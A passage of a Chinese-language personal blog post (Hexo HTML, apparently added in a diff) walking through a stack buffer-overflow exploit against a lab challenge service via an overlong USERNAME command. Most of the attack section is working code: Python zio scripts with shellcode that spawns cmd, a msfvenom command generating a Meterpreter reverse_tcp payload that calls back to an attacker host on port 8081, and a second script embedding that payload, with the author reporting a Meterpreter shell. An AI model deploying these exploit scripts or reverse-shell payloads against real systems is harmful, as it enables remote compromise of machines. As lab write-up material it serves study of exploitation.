+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" title="漏洞利用"></a>漏洞利用</h4><p>接下来构造shellcode。</p>
+<p>看到栈空间的布局之后，计算shellcode在栈中的位置，注意的是栈的对齐，即jmp esp时esp的位置一定是4的整数倍。</p>
+<p>这次采用二次跳转的方式执行shellcode。</p>
+<p><img src="/images/2016/4-06/20-42.png"><br><img src="/images/2016/4-06/20-43.png"></p>
+<p>为什么用sub一个负数来调整栈位置呢？因为如果使用正数，字符串中就会出现\x00，字符串拷贝函数就会从这里截断。</p>
+<p><img src="/images/2016/4-06/20-45.png"></p>
+<p>这里就是我们的shellcode了。</p>
+<p><img src="/images/2016/4-06/20-46.png"></p>
+<p>弹出了一个cmd，下面是shellcode的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line">host = &quot;172.16.189.218&quot;</span><br><span class="line">port = 2993</span><br><span class="line">io = zio((host,port))</span><br><span class="line">io.read_until(&#x27;*************** Welcome to take the challenge! *****************\n&#x27;)</span><br><span class="line">shellcode =(&quot;\x31\xc0\xeb\x13\x5b\x88\x43\x0e\x53\xbb\xad\x23\x86\x7c\xff\xd3\xbb&quot;</span><br><span class="line">&quot;\xfa\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78&quot;</span><br><span class="line">&quot;\x65\x20\x2f\x63\x20\x63\x6d\x64&quot;)</span><br><span class="line">print len(shellcode)</span><br><span class="line"># print shellcode.encode(&#x27;hex&#x27;)</span><br><span class="line">ret = 0x0012f3d4</span><br><span class="line">io.write(&#x27;USERNAME &#x27; + &#x27;a&#x27;*3 + &#x27;\x81\xEC\xC8\xFE\xFF\xFF\xFF\xE4&#x27; + shellcode + &#x27;\x90&#x27;*(511-11-len(shellcode)) + l32(ret) + &#x27;\x0d\x0a&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="深度利用"><a href="#深度利用" class="headerlink" title="深度利用"></a><a href="#%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8" title="深度利用"></a>深度利用</h4><p>用msfvenom生成一段shellcode。</p>
+<figure class="highlight autoit"> 
+
+<pre>
+
+<div class="line">root<span class="symbol">@bogon</span>:~<span class="meta"># msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.189.233 lport=8081 -f python -b <span class="string">'\x00'</span> -n 12</span></div>
+
+</pre>
+
+
+</figure>
+
+<p>新的攻击代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = &quot;172.16.189.218&quot;</span><br><span class="line"></span><br><span class="line">port = 2993</span><br><span class="line"></span><br><span class="line">io = zio((host,port))</span><br><span class="line"></span><br><span class="line">io.read_until(&#x27;*************** Welcome to take the challenge! *****************\n&#x27;)</span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\x3f\x9f\x49\xf8\x3f\xd6\xfd\x41\x92\xfc\x41\x41\xdb&quot;</span><br><span class="line">buf += &quot;\xd3\xd9\x74\x24\xf4\xb8\xc1\xf9\xbb\x2a\x5a\x2b\xc9&quot;</span><br><span class="line">buf += &quot;\xb1\x54\x31\x42\x18\x03\x42\x18\x83\xea\x3d\x1b\x4e&quot;</span><br><span class="line">buf += &quot;\xd6\x55\x5e\xb1\x27\xa5\x3f\x3b\xc2\x94\x7f\x5f\x86&quot;</span><br><span class="line">buf += &quot;\x86\x4f\x2b\xca\x2a\x3b\x79\xff\xb9\x49\x56\xf0\x0a&quot;</span><br><span class="line">buf += &quot;\xe7\x80\x3f\x8b\x54\xf0\x5e\x0f\xa7\x25\x81\x2e\x68&quot;</span><br><span class="line">buf += &quot;\x38\xc0\x77\x95\xb1\x90\x20\xd1\x64\x05\x45\xaf\xb4&quot;</span><br><span class="line">buf += &quot;\xae\x15\x21\xbd\x53\xed\x40\xec\xc5\x66\x1b\x2e\xe7&quot;</span><br><span class="line">buf += &quot;\xab\x17\x67\xff\xa8\x12\x31\x74\x1a\xe8\xc0\x5c\x53&quot;</span><br><span class="line">buf += &quot;\x11\x6e\xa1\x5c\xe0\x6e\xe5\x5a\x1b\x05\x1f\x99\xa6&quot;</span><br><span class="line">buf += &quot;\x1e\xe4\xe0\x7c\xaa\xff\x42\xf6\x0c\x24\x73\xdb\xcb&quot;</span><br><span class="line">buf += &quot;\xaf\x7f\x90\x98\xe8\x63\x27\x4c\x83\x9f\xac\x73\x44&quot;</span><br><span class="line">buf += &quot;\x16\xf6\x57\x40\x73\xac\xf6\xd1\xd9\x03\x06\x01\x82&quot;</span><br><span class="line">buf += &quot;\xfc\xa2\x49\x2e\xe8\xde\x13\x26\xdd\xd2\xab\xb6\x49&quot;</span><br><span class="line">buf += &quot;\x64\xdf\x84\xd6\xde\x77\xa4\x9f\xf8\x80\xcb\xb5\xbd&quot;</span><br><span class="line">buf += &quot;\x1f\x32\x36\xbe\x36\xf0\x62\xee\x20\xd1\x0a\x65\xb1&quot;</span><br><span class="line">buf += &quot;\xde\xde\x10\xb4\x48\x4d\xf4\x0b\x61\xe5\xf7\x73\x6e&quot;</span><br><span class="line">buf += &quot;\x67\x7e\x95\xc0\xd7\xd1\x0a\xa0\x87\x91\xfa\x48\xc2&quot;</span><br><span class="line">buf += &quot;\x1d\x24\x68\xed\xf7\x4d\x02\x02\xae\x26\xba\xbb\xeb&quot;</span><br><span class="line">buf += &quot;\xbd\x5b\x43\x26\xb8\x5b\xcf\xc3\x3c\x15\x38\xa1\x2e&quot;</span><br><span class="line">buf += &quot;\x41\x59\x49\xaf\x91\xf0\x49\xc5\x95\x52\x1d\x71\x97&quot;</span><br><span class="line">buf += &quot;\x83\x69\xde\x68\xe6\xe9\x19\x96\x77\xd8\x52\xa0\xed&quot;</span><br><span class="line">buf += &quot;\x64\x0d\xcc\xe1\x64\xcd\x9a\x6b\x65\xa5\x7a\xc8\x36&quot;</span><br><span class="line">buf += &quot;\xd0\x85\xc5\x2a\x49\x13\xe6\x1a\x3d\xb4\x8e\xa0\x18&quot;</span><br><span class="line">buf += &quot;\xf2\x10\x5a\x4f\x81\x57\xa4\x0d\xa7\xff\xcd\xed\xe7&quot;</span><br><span class="line">buf += &quot;\xff\x0d\x84\xe7\xaf\x65\x53\xc8\x40\x46\x9c\xc3\x08&quot;</span><br><span class="line">buf += &quot;\xce\x17\x85\xfb\x6f\x27\x8c\x5a\x2e\x28\x22\x47\x27&quot;</span><br><span class="line">buf += &quot;\xa7\xc5\x78\x48\x49\xfa\xae\x71\x3f\x3b\x73\xc6\x30&quot;</span><br><span class="line">buf += &quot;\x76\xd6\x6f\xdb\x78\x44\x6f\xce&quot;</span><br><span class="line">shellcode = buf</span><br><span class="line">print len(shellcode)</span><br><span class="line"># print shellcode.encode(&#x27;hex&#x27;)</span><br><span class="line">ret = 0x0012f3d4</span><br><span class="line">io.write(&#x27;USERNAME &#x27; + &#x27;a&#x27;*3 + &#x27;\x81\xEC\xC8\xFE\xFF\xFF\xFF\xE4&#x27; + shellcode + &#x27;\x90&#x27;*(511-11-len(shellcode)) + l32(ret) + &#x27;\x0d\x0a&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/2016/4-06/20-57.png"></p>
+<p>成功获得Meterpreter的shell，接下来就是meterpreter的各种用法了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
